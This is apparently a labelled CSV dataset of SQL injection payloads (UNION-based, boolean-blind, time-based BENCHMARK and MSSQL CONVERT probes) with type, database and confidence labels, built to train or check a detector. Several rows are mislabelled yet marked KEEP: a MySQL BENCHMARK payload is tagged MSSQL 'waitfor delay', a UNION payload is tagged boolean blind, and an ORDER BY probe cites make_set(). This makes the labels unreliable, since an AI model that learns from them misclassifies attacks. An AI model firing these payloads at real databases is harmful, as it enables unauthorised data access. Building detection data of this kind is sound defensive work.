payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"-3862' ) ) union all select 2495,2495,2495,2495,2495,2495,2495--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2400,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-3862' ) ) union all select 2495,2495,2495,2495,2495,2495,2495--"
"1' ) as pfwt where 8448 = 8448 union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2401,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' ) as pfwt where 8448 = 8448 union all select null,null,null,null,null,null,null,null,null#"
"-5205' ) ) union all select 8592,8592,8592,8592,8592,8592--",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2402,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5205' ) ) union all select 8592,8592,8592,8592,8592,8592--"
"1"" ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ""vjvz"" like ""vjvz",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2403,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ""vjvz"" like ""vjvz"
"1' ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( 'urxs' = 'urxs",time_blind,mssql,0.9,waitfor delay MSSQL time blind,KEEP,,time_blind,mssql,2404,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( 'urxs' = 'urxs"
"-5518 ) as yvqm where 7360 = 7360 union all select 7360,7360#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2405,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-5518 ) as yvqm where 7360 = 7360 union all select 7360,7360#"
-3359' order by 1--,boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2406,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,-3359' order by 1--
"-6618"" ) ) ) order by 1#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2407,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,"-6618"" ) ) ) order by 1#"
"-6492' ) union all select 7204,7204--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2408,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6492' ) union all select 7204,7204--"
"1%"" and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""%"" = """,boolean_blind,mssql,0.8,CONVERT INT for blind,KEEP,,boolean_blind,mssql,2409,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1%"" and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""%"" = """
